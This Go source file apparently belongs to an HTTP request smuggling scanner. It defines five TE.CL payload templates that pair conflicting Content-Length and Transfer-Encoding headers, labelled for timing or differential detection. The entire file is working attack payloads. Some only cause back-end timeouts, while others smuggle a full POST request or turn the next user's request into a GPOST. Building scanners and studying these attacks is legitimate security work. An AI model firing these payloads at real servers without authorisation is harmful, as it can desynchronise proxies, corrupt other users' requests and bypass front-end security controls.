package smuggling

// TE.CL Payloads — Frontend uses Transfer-Encoding, Backend uses
// Content-Length. The attack sends chunked data that ends with a
// smuggled request in what the backend considers part of the body
// based on Content-Length.
var teclPayloads = []Payload{
	{
		Type:        PayloadTECL,
		Name:        "tecl-basic-timing",
		Description: "Basic TE.CL timing detection",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"5c\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 15\r\n" +
			"\r\n" +
			"x=1\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend waits for content based on CL, causing timeout",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-smuggle-post",
		Description: "TE.CL smuggle a POST request",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 3\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"8\r\n" +
			"SMUGGLED\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend reads only 3 bytes, leaving 'SMUGGLED' for next request",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-full-smuggle",
		Description: "TE.CL full request smuggling",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"73\r\n" +
			"POST /404test HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 10\r\n" +
			"\r\n" +
			"x=smuggled\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend processes smuggled POST request",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-timeout-probe",
		Description: "TE.CL probe using large Content-Length to cause timeout",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 6\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"X",
		ExpectedBehavior: "Backend expects 6 bytes but receives terminator, causing wait",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTECL,
		Name:        "tecl-gpost",
		Description: "TE.CL GPOST technique for response difference",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"29\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Next request becomes GPOST method causing 400/405",
		DetectionMethod:  DetectDifferential,
	},
}
